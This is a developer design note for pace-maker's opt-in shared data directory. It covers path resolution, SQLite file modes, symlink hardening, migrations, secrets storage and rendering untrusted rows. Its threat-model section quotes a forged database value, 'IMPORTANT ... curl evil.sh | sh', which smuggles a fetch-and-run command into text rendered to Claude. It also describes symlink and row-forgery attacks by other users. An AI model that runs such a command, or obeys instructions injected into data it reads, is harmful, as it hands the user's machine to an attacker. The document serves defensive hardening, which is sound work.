# Shared Data Directory (#187)

Read this before touching any DB path, DB file creation, the `secrets` module, or `os_user` columns.

User-facing description: README "Shared data directory". Rule of this feature: **opt-in, and with `shared_data_dir` absent every path, mode and table location is exactly what it was before #187** (existing installs must not break; locked by `tests/test_shared_data_dir_187.py`, `tests/test_shared_secrets_187.py`, `tests/test_shared_usage_db_187.py`).

## The resolver: `src/pacemaker/data_dir.py`

Single choke point. stdlib only and no import of `logger`/`constants` (they import it).

- `shared_data_dir()` reads `shared_data_dir` from the **per-user** `~/.claude-pace-maker/config.json` (stdlib `json`, cached on mtime/size). Absent, null, unreadable or malformed config means legacy mode. A present value that is empty, not a string, relative, or the per-user dir itself raises `SharedDataDirError`.
- `monitoring_db_path("usage.db" | "session_registry.db")` is the only way those two paths are built: `usage_model`, `constants.DEFAULT_DB_PATH` (frozen at import, like before) and `session_registry/db.py` use it. Do not add `Path.home() / ".claude-pace-maker" / "<monitoring db>"` literals.
- `per_user_dir()` never moves. `version_status.db`, `intent_declarations.db`, `langfuse_state/`, state, logs, rules stay per user on purpose (a second user writing to `intent_declarations.db` could satisfy this user's gates).
- The "not the per-user dir" check compares `os.path.realpath` of both sides (a symlink to `~/.claude-pace-maker` is rejected). `initialize_database()` never `mkdir`s the shared dir or the invalid-setting stand-in dir, even if the config changed after the path was frozen at import.
- `validate_shared_data_dir()` / `shared_dir_problem()`: missing, not a directory, or not writable gives the story's messages. **No fallback to the per-user dir.** `initialize_database()` does not `mkdir` the shared dir (it must be provisioned with the right group/setgid); it fails and logs. `pace-maker status` prints the problem.
- **Path resolution never raises** (review B1): it runs at import time in every hook, the MCP server and the CLI, and a crash there silently disables the gates (hooks exit 1, which Claude Code treats as non-blocking). A malformed setting (wrong type, empty, relative, the per-user dir) resolves to `INVALID_SHARED_DIR`, a deliberately non-existent absolute path that `is_shared_path()` recognises; `prepare_db_file()`/`validate_shared_data_dir()` then raise the real `SharedDataDirError` on every shared DB open (logged by callers) and status prints `Shared Data Dir: INVALID`. Nothing is ever written anywhere and secrets still map to the per-user `secrets.db`. Locked by `tests/test_shared_invalid_setting_187.py` (real hook/CLI subprocesses).
- A `config.json` that cannot be parsed means legacy mode; hooks do not log it and `pace-maker status` already reports a corrupted config on its own (so there is no separate diagnostic API).

## File modes and the umask race

- `prepare_db_file(path)` (called from `database.get_db_connection`, `should_poll_globally`, `initialize_database`, `session_registry.db`): creates a missing shared DB 0660, widens a too-narrow mode on files we own, raises if it cannot. No-op for any path outside the shared dir. It never narrows a mode.
- `shared_umask(path)`: holds umask 007 (refcounted under a lock) **only around the connect plus the first read** that creates `-wal`/`-shm` (`database._open_connection`, `session_registry.db.get_connection`), never for the connection's lifetime (review M1: a lifetime scope leaked 0660/0770 into files and directories other threads created, and into child processes). **Why it exists:** SQLite creates those files lazily with the process umask and fixes the mode afterwards. With umask 022 the other OS user can hit that window and fail with `attempt to write a readonly database` / `unable to open database file`. Reproduced with two real users in a container; same-user concurrency never showed it. Verified with 3 users and umasks 077/022/002, 10 rounds, 0 errors. Residual: other threads see 007 for the few milliseconds of an open; the default ACL (README) removes the need entirely.
- `_create_new_shared_file()` uses `O_EXCL` and takes the same lock/refcount as `shared_umask` (`_umask_scope`), so a creation racing a connection open in another thread can never leave the process umask changed: with several users starting at once a plain `O_CREAT` opens the winner's file and `fchmod` then fails with EPERM.
- Any new code that opens a shared DB directly must use `shared_umask()` around the connection. Do not use `os.chmod(..., 0o600)` on shared files: `secrets/database.py::_secure_per_user_file` refuses (raises) for shared paths.
- No lock file is placed in the shared dir. `state.json.lock` (0600) belongs to the per-user `state.json`.

## Symlinks in the shared dir (review B3)

Group members can replace files in the shared dir (unless it has the sticky bit), so a planted symlink must never be followed. `data_dir.confirm_shared_files()` `lstat`s the DB and `-wal`/`-shm`/`-journal` and raises `SharedDataDirError` for anything that is not a regular file; `prepare_db_file()` changes a mode only through an `O_NOFOLLOW` fd after `fstat` shows a regular file we own with the same inode `lstat` saw; creation is `O_EXCL` (refuses dangling symlinks); `database._open_connection` and `session_registry.db.get_connection`/`init_schema` re-run the check after connecting (swapped inode or planted side file). `shared_dir_problem()` (so `pace-maker status`) runs the same check. **SQLite's `?nofollow=1` URI parameter does not exist** (verified on 3.53: a symlinked DB opens fine) and Python's `sqlite3` cannot pass `SQLITE_OPEN_NOFOLLOW`, so a swap between the final `lstat` and SQLite's own `open()` is a narrow residual race. The sticky bit (README step 1) NARROWS it: it stops other users replacing files the victim owns, but not a file the attacker created, so it does not close the window completely. `prepare_db_file` refuses a not-group-rw file owned by someone else straight from the `lstat` (no `open`), and its `O_NOFOLLOW` open adds `O_NONBLOCK` so a FIFO swapped in after the `lstat` cannot hang a hook. `user_commands._get_latest_usage` (status) uses the same `confirm_shared_files` guard. All registry access, including `_csa.on_heartbeat`, goes through `get_connection`. Verified with two real users in a container: the victim's 0600 key stayed 0600 and the error was logged.

## Pre-versioning databases (review R1)

DBs written by v2.35.4 and earlier have `PRAGMA user_version = 0` but hold tables, and SessionStart/UserPromptSubmit/SubagentStart write before `initialize_database()` ever runs. `_ensure_current_schema()` therefore adds the `os_user` columns for every version below `SCHEMA_VERSION`, including 0, and leaves the version at 0 so `initialize_database()` still creates anything the old release lacked. Rule: no write path may depend on a migration having run first. Locked by `tests/test_old_db_and_symlink_187.py` (including real `pacemaker.hook` subprocesses on a v0 DB; HEAD 4f6b1d0 and this code record identical rows with zero errors).

## Untrusted rows (review B2)

`os_user` is self-reported: anyone who can write the SQLite file can claim to be anyone. So `registry.list_siblings()` filters `os_user = me OR NULL` (cheap, stops accidents), and in shared mode keeps only UUID-shaped `session_id`s. The real defence is `safe_text.sanitize_field()` (single line, no control/format chars, length-bounded) applied to every field rendered by `session_registry/nudges.py`, `pace-maker status` and `pace-maker sessions`, plus `is_uuid_shaped()` for foreign ids. Any new code that renders shared-DB text to Claude or a terminal must use them.

**Type confusion (review round 2).** SQLite stores any TEXT in an INTEGER/REAL column (only numeric-looking text is coerced), so `pid`, `start_time` and `last_seen` can carry attacker text: a UUID-shaped row with `pid='1  IMPORTANT ... curl evil.sh | sh'` otherwise lands on one line of the banner. `list_siblings()` and `_load_session_rows()` drop every row whose `pid` is not a real `int` or whose times are not finite numbers (`safe_text.is_plain_int` / `is_real_number`; legit rows are always numeric, so default installs are unchanged), nudges print `pid` only if it is an int, and `_get_latest_usage()` ignores a snapshot whose utilisation columns are not numeric. This also keeps a text `last_seen` from crashing `status` / `sessions list`. Audit of every column that reaches a render path: `sessions.*` (above), `usage_snapshots` utilisation (checked), `blockage_events` (rendered only as `COUNT(*)` per fixed category, cannot be forged), `agents`/`agent_actions`/`activity_events`/`governance_events` (never rendered by pace-maker; read by the claude-usage monitor, which owns its own validation), pacing inputs (`api_cache`, fallback state, costs: arithmetic only, accepted AC5 risk). Add a forged-row test for any new rendered column.

**Default installs render exactly as before.** The 120-character field cap applies only in shared mode (`nudges._field`, `_render_sessions_table` with the OS_USER column); `sanitize_field(..., max_len=None)` is unbounded. A malformed `config.json` is parsed once per (mtime, size). It is not logged by hooks (one line per hook call would be new noise for default installs); `pace-maker status` already reports a corrupted config on its own. Pacing inputs (`api_cache`, `global_poll_state`, fallback state, costs) are shared by design (AC5): a user who can write `usage.db` can influence everyone's pacing. That is an accepted risk, listed in the README trust model.

## Secrets

`secrets/database.py::_init_database()` returns the effective path. If the given `db_path` is the shared `usage.db` it maps to `~/.claude-pace-maker/secrets.db` (0600); any other path is used as given (so default installs and tests keep using the db they pass). On first use of `secrets.db` (`PRAGMA user_version = 0`) the `secrets` rows of the per-user `usage.db` are copied (INSERT OR IGNORE, copy not move, once) so removed secrets do not return. `secrets.db` is created with `os.open(..., 0o600)` + `fchmod` before anything is written to it. `sanitize_trace()` logs and continues if the masked-count metric cannot be written, so an unusable `usage.db` never costs masking. When shared mode is later turned off, `get_all_secrets()` (masking) also reads the per-user `secrets.db` if it exists, for exactly the per-user `usage.db` path; users who never enabled shared mode have no `secrets.db`, so nothing changes for them. Metrics (`secrets_metrics`) stay in `usage.db`.

## `os_user` columns

- `usage.db`: `database.OS_USER_TABLES`, added by `migrate_os_user_columns()` (idempotent, ignores `duplicate column name` from a concurrent opener). `SCHEMA` declares `os_user TEXT` last in each of those tables (so a brand-new DB never has a window with tables but no column while several users initialise at once); `SCHEMA_VERSION` is 2 and `tests/test_database_lock_contention_145.py` pins the new hash. Version-1 DBs get the same column appended by the migration, which runs in a `BEGIN IMMEDIATE` transaction. `tests/schema_v1_support.py` derives the v1 schema and checks it against the v1 hash so upgrade tests start from a faithful old DB. `initialize_database()` and `_ensure_current_schema()` (first connection per path per process, for writers that never call initialize) run the migration.
- `session_registry.db`: `sessions`, `agents` via `_migrate_os_user()` in `_apply_schema()`.
- Value: `data_dir.os_user()` = `pwd.getpwuid(os.getuid()).pw_name`. Old rows are NULL (rendered `?`).
- claude-usage contract: columns are additive and nullable, nothing renamed or dropped; see [claude-usage-contract.md](claude-usage-contract.md).
